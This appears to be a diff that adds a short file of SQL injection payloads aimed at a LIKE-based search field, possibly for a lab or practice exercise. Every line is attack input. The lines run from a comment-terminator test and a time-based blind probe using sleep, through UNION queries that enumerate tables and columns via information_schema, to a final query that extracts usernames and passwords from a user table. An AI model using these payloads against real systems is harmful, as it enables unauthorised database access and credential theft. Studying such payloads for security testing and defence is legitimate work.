@@ -1,0 +1,10 @@
+%'; --
+ook%' and 0 = sleep(1); --
+
+ook%' union (select 1, 2); --
+
+ook%' union (select TABLE_NAME, TABLE_SCHEMA from information_schema.TABLES); --
+
+ook%' union (select COLUMN_NAME, 1 from information_schema.COLUMNS where TABLE_NAME = 'user'); --
+
+ook%' union (select username, password from user); --
